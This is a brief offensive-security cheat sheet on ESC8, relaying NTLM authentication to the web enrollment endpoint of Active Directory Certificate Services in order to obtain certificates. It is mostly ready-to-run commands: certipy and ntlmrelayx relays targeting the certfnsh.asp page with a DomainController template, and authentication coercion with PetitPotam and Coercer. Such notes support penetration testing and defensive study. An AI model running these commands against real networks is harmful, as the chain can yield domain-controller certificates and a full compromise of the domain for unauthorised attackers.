# ESC8 - Web Enrollment
If the WebEnrollment service (HTTP) is activated on the ADCS, it is then possible to relay NTML authentification through this endpoint in order to create certificate. It should be noted that most of the  coercition methods (MS-EFSR, MS-RPRN, webdev, DCOM coercition, etc.) results can be used to exploit ESC8. 

## Exploitation
--------------------

1/ Setup the NTLMrelay 

```text-plain
certipy relay -ca [CA] -template [DomainController] -target [CA_ip]
ntlmrelayx.py -t http://[CA]/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

2/ Coerce an authentication on the NTLM server

```text-plain
petitpotam.py [target] [DC]
Coercer.py coerce --always-continue -u '[USER]' -p '[PASSWORD]' --target [TARGET] --listener-ip
petitpotam.exe
etc.
```

## Notes 
--------------------



